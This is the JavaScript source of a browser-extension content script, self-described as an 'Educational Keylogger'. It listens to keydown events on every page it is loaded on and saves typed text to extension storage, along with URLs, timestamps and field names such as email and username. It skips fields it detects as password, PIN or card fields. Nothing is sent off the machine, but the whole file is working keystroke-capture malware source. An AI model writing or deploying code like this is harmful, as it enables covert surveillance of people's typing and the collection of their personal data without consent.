console.log("🔐 Educational Keylogger loaded on:", window.location.hostname);

// Variable to accumulate current text
let currentText = '';

// Function to detect field type
function detectFieldType(element) {
    if (!element) return 'text';
    
    // Detect password fields - DO NOT CAPTURE
    if (element.type === 'password') {
        return 'password';
    }
    
    // Detect by field name or id
    const fieldName = (element.name || element.id || '').toLowerCase();
    
    // Sensitive fields - DO NOT CAPTURE
    if (fieldName.includes('password') || fieldName.includes('passwd') || fieldName.includes('pwd') || fieldName.includes('pass')) {
        return 'password';
    }
    if (fieldName.includes('cvv') || fieldName.includes('pin')) {
        return 'cvv/pin';
    }
    if (fieldName.includes('credit') || fieldName.includes('card') || fieldName.includes('cardnumber')) {
        return 'credit-card';
    }
    
    // Non-sensitive field types
    if (fieldName.includes('email') || fieldName.includes('mail')) {
        return 'email';
    }
    if (fieldName.includes('user') || fieldName.includes('username')) {
        return 'username';
    }
    if (fieldName.includes('search')) {
        return 'search';
    }
    
    return 'text';
}

// Variable to track last active element
let lastElement = null;

// Function to save accumulated text
function saveText(element) {
    if (currentText.trim().length > 0) {
        const fieldType = detectFieldType(element || lastElement);
        
        // DO NOT CAPTURE sensitive fields (passwords, CVV, credit cards)
        if (fieldType === 'password' || fieldType === 'cvv/pin' || fieldType === 'credit-card') {
            console.log('🔒 Sensitive field detected - NOT captured:', fieldType);
            currentText = ''; // Clear text without saving
            return;
        }
        
        const logEntry = {
            text: currentText,
            url: window.location.href,
            hostname: window.location.hostname,
            timestamp: new Date().toISOString(),
            date: new Date().toLocaleString('en-US'),
            fieldType: fieldType,
            fieldName: element ? (element.name || element.id || 'unnamed') : 'unknown'
        };
        
        // Check if extension context is still valid
        if (!chrome.runtime?.id) {
            console.log('Extension context invalidated - please reload the page');
            return;
        }
        
        // Get existing logs and add new one
        chrome.storage.local.get(['keylogs'], function(result) {
            if (chrome.runtime.lastError) {
                console.log('Storage error:', chrome.runtime.lastError.message);
                return;
            }
            
            const logs = result.keylogs || [];
            logs.push(logEntry);
            
            // Save to Chrome Storage
            chrome.storage.local.set({ keylogs: logs }, function() {
                if (chrome.runtime.lastError) {
                    console.log('Storage error:', chrome.runtime.lastError.message);
                    return;
                }
                console.log('💾 Text saved [' + fieldType + ']:', currentText.substring(0, 50) + '...');
            });
        });
        
        // Reset current text
        currentText = '';
    }
}

// Listen to each key press
document.addEventListener('keydown', function(event) {
    const target = event.target;
    lastElement = target;
    
    // Don't capture control keys that are not text
    const ignoredKeys = ['Shift', 'Control', 'Alt', 'Meta', 'Tab', 'Escape', 'CapsLock'];
    if (ignoredKeys.includes(event.key)) {
        return;
    }
    
    // Detect field type
    const fieldType = detectFieldType(target);
    
    // Skip if sensitive field
    if (fieldType === 'password' || fieldType === 'cvv/pin' || fieldType === 'credit-card') {
        console.log('Sensitive field - input ignored');
        return;
    }
    
    // Process the key
    if (event.key === 'Enter') {
        currentText += '\n';
        saveText(target); // Save on Enter press
    } else if (event.key === 'Backspace') {
        currentText = currentText.slice(0, -1);
    } else if (event.key === ' ') {
        currentText += ' ';
        saveText(target); // Save on space press (complete word)
    } else if (event.key && event.key.length === 1) { // Only individual characters
        currentText += event.key;
    }
    
    console.log('Captured [' + fieldType + ']:', event.key, '| Accumulated:', currentText.length, 'characters');
});

// Save text when user leaves a field (blur)
document.addEventListener('blur', function(event) {
    // Only save if it's an input/textarea and has accumulated content
    if ((event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') && currentText.trim().length > 0) {
        setTimeout(() => saveText(event.target), 100);
    }
}, true);

// Save before closing the page
window.addEventListener('beforeunload', function() {
    saveText();
});